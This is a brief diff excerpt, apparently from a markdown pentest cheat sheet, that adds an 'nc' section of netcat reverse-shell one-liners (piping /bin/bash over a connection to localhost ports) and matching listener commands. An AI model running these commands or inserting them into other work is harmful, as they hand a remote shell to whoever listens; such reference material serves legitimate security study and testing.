@@ -6,7 +6,14 @@
 
 ## general
 
-### powershell
+### nc
+
+```bash
+nc 127.0.0.1 1234 -e /bin/bash
+nc 127.0.0.1 1234 | /bin/bash | nc 127.0.0.1 2345
+nc -nvlp 1234
+nc -nvlp 2345
+```
 
 ### powercat
 
